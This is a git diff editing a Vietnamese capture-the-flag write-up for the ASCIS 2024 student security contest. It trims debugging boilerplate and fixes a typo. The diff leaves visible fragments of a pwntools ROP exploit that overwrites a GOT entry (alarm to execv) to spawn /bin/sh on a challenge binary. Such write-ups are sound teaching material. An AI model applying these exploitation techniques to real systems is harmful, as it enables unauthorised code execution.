@@ -1,5 +1,5 @@
 ---
-title: "Chung khảo Sinh viên với An toàn Thông tin 2024"
+title: "Sinh viên với An toàn Thông tin 2024"
 date: 2024-11-30
 draft: false
 tags: ["ASCIS 2024", "Reverse-Engineering", "Pwnable"]
@@ -119,16 +119,6 @@ context.update(arch='amd64', os='linux', log_level='debug', terminal='cmd.exe /c
 
 p = process(exe.path)   
 
-def GDB(): 
-    gdb.attach(p, gdbscript='''
-        b *0x401261
-        continue
-    ''')
-
-    pause()
-
-GDB()
-
 payload = flat(
     b'A' * 0x20, 
     0xdeedbeef,         # New RBP 
@@ -188,7 +178,7 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 
 Các công việc mình cần phải xử lý bây giờ là: 
 1. Overwrite 2 bytes cuối cùng của GOT `alarm()` thành `execv()`. \
-Do cùng phiên bản libc nên 12 bits cuối của các hàm libc luôn giữ nguyên. Ví dụ alarm = 0x1555553d3540 thì `540` luôn được giữ nguyên, overwrite 2 bytes cuối làm thay đổi giá trị `3`. Lúc này sẽ cần bruteforce để tìm chính xác địa chỉ, xác xuất thành công là **1/16 = 6.25%**.
+Do cùng phiên bản libc nên 12 bits cuối của các hàm libc luôn giữ nguyên. Ví dụ alarm = 0x1555553d3540 thì `540` luôn được giữ nguyên, overwrite 2 bytes cuối làm thay đổi giá trị `3`. Lúc này sẽ cần bruteforce để tìm chính xác địa chỉ, xác suất thành công là **1/16 = 6.25%**.
 2. Ghi chuỗi `/bin/sh\x00` lên bộ nhớ. 
 3. [RSI] = 0, trong đó RSI là một địa chỉ hợp lệ.
 
@@ -205,28 +195,6 @@ Mình xây dựng lại cấu trúc bộ nhớ như sau, trong đó [0x404040] t
 <img src="./imgs/2.png"/>
 
 ```python
-#!/usr/bin/env python3
-from pwn import *
-import time
-
-exe = ELF('./chall_patched', checksec=False)
-libc = ELF('./libc.so.6', checksec=False)
-ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
-
-context.update(arch='amd64', os='linux', log_level='debug', terminal='cmd.exe /c start wsl'.split(), binary=exe)
-
-p = process(exe.path)   
-
-def GDB(): 
-    gdb.attach(p, gdbscript='''
-        b *0x401261
-        continue
-    ''')
-
-    pause()
-
-GDB()
-
 pop_rdi = 0x401247
 pop_rbp = 0x40119d
 ret = 0x40101a
@@ -255,7 +223,6 @@ p.send(payload)
 input('input 3: change 2 bytes')
 p.send(b'\xc0\x41')
 
-p.interactive()
 ```
 
 Kết quả thu được như mình mong muốn, 2 bytes cuối của `alarm@got` bị ghi thành `/x41/xc0`, RBP = 0x404120. 
